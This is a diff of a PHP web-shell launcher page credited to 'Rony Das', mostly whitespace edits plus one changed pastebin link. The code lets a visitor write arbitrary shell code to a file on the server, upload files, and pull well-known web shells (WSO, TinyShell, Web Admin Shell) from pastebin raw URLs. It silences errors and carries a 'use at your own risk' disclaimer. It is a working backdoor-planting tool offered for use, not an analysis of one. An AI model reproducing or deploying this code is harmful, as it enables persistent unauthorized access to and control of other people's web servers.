@@ -101,11 +101,11 @@ a {
     color: white;
 }
 </style>
-
+ 
 <?php
-
+ 
 error_reporting(0);
-
+ 
 if (isset($_GET['createashell'])) {
     $load = $_GET['createashell'];
     if (isset($load)) {
@@ -114,7 +114,7 @@ if (isset($_GET['createashell'])) {
         } else {
             echo '<h2>The Current Directory is <font color="red">NOT writeable</font> .. </h2>';
         }
-        
+       
         echo '<form action="" method="post">File Name:<br><input type="text" name="filename" placeholder="File Name"><br><br>ShellCode:<br><textarea name="content" rows=32 cols=100 placeholder="Input the ShellCode"></textarea><br><br><input type="submit" value="Inject Shell"></form>';
         if (isset($_POST['filename']) && isset($_POST['content'])) {
             $filename    = @$_POST['filename'];
@@ -135,9 +135,9 @@ if (isset($_GET['createashell'])) {
         die();
     }
 }
-
+ 
 ?>
-
+ 
 <form action="" method="post">
     <input type="submit" name="exec" value="System Shell">
     <input type="submit" name="mannushell" value="Mannu Shell ICA">
@@ -152,9 +152,9 @@ if (isset($_GET['createashell'])) {
 </form>
 <button onclick="window.location.search='?createashell';">Create a Shell</button>
 <button onclick="window.location.search='?upload';">Upload</button><br><br>
-
+ 
 <?php
-
+ 
 if (isset($_POST['exec'])) {
     die("<h1>System Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/wwRaBWEG')) . "</textarea></form>");
 }
@@ -162,7 +162,7 @@ if (isset($_POST['wso'])) {
     die("<h1>WSO Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/v5QMfGnM')) . "</textarea></form>");
 }
 if (isset($_POST['raz'])) {
-    die("<h1>TinyShell by Raz</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/T76RBNLY')) . "</textarea></form>");
+    die("<h1>TinyShell by Raz</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/xbe5zELG')) . "</textarea></form>");
 }
 if (isset($_POST['webAdmin'])) {
     die("<h1>Web Admin Shell</h1><form method=\"post\"><textarea rows=32 cols=100>" . htmlentities(file_get_contents('http://pastebin.com/raw/UrQNucNz')) . "</textarea></form>");
@@ -193,7 +193,7 @@ if (isset($_GET['upload'])) {
     }
     die('<p>Upload a File</p><br> <form action="" method="post" enctype="multipart/form-data">Filename: <input type="file" name="file" /><input type="submit" value="Submit"/>');
 }
-
+ 
 echo "<h1>Welcome Geek!</h1>";
 echo "<br><h4>Use this at your own risk , coder is not responisble for what you do with this..</h4>";
 echo "<br><h3><font color=\"orange\">Coded</font> by <font color=\"lime\">Rony Das</font></h3>";
